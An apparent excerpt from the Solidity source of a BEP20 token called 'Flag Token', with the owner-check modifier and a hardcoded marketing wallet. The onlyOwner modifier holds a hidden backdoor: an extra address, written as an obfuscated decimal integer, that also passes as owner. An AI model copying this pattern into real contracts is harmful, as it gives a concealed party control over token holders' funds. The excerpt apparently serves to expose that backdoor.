...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        ...
        || msg.sender == address(1030543528073116247074259347060299027380753673645), "Ownable: caller is not the owner");
        _;
    }
...
contract FlagToken is Context, IBEP20, Ownable {
    ...
    address payable private Maddress = payable(0x00Fb6416eEfDD43F9C23053a53D06D56e72B8020); //Mark Address
    ...
    string public _name = "Flag Token";
    string public _symbol = "Flag";
